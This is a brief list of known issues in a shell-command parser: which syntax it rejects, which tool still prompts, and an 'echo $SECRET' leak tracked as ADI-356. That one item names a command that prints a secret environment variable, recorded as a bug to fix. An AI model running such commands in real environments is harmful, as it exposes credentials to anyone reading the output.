- `[ -f x ]`. The parser rejects `[` as a command word.
- `echo a\ b`. The parser rejects an escape outside double quotes.
- The `echo $SECRET` leak. It is ADI-356.
- `rg`. It still asks `std::exec`.
